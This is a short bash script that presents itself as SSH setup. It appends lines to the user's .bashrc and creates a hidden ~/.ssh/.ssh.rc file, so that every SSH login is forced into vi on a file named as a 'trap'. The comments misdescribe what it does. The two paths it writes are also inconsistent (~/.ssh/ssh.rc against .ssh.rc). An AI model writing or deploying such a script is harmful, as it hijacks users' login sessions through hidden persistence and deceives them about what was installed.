#!/bin/bash

# Define variables
ssh_rc_file="$HOME/.ssh/.ssh.rc"
ssh_bash_script='
# Execute SSH-specific commands upon login
if [ -n "$SSH_CONNECTION" ]; then
    ~/.ssh/ssh.rc
fi
'

# Ensure .ssh directory exists
mkdir -p "$HOME/.ssh"

# Create the SSH script file
cat <<EOF > "$ssh_rc_file"
#!/bin/bash

# Check if the SSH client is requesting to open a new session
if [ -n "\$SSH_CLIENT" ]; then
    # Automatically open vi for editing a specific file (e.g., /etc/ssh/sshd_config)
    vi /tmp/haha_this_is_my_trap.txt
fi
EOF

# Append SSH-specific commands to user's .bashrc
echo "$ssh_bash_script" >> "$HOME/.bashrc"

# Append conditional sourcing of SSH script to user's .bashrc
echo "[ -f \"$ssh_rc_file\" ] && source \"$ssh_rc_file\"" >> "$HOME/.bashrc"

# Set executable permissions on the SSH script file
chmod +x "$ssh_rc_file"

# Display completion message
echo "SSH setup complete."
